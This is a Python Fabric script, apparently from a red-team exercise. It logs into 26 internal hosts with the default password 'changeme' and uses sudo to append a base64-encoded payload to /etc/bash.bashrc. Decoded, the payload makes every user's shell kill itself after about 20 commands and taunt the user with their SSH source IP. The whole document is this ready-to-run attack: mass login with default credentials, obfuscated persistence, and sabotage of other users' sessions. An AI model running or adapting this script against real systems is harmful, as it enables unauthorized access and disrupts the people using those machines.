from fabric import Connection, SerialGroup as Group, Config
import getpass
hosts = []
for i in range (1,14):
	single=f"admin@10.{i}."
	hosts.extend([single+"1.10", single+"1.20"])

for hostelele in hosts:
	try:
		config = Config(overrides={'sudo':{'password':'changeme'}})
		c = Connection(hostelele, connect_kwargs={"password":"changeme"}, config=config)
		c.sudo("sh -c 'echo \"ZXhwb3J0IENPVU5UPTIwCmV4cG9ydCBQUk9NUFRfQ09NTUFORD0iZXhwb3J0IENPVU5UPVwiXCQoZXhwciBcJENPVU5UIC0gMSlcIjsgZWNobyBcJENPVU5UOyBpZiBbIFwkQ09VTlQgLWx0IDAgXTsgdGhlbiBlY2hvIFwiQnllIDspIFwkKGVjaG8gXCRTU0hfQ09OTkVDVElPTiB8IGF3ayAne3ByaW50IFwkMX0nKVwiOyBzbGVlcCAxOyBraWxsIC05IFwkUFBJRDsgZmkiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK\" | base64 -d | sudo tee -a /etc/bash.bashrc'")
	except:
		continue
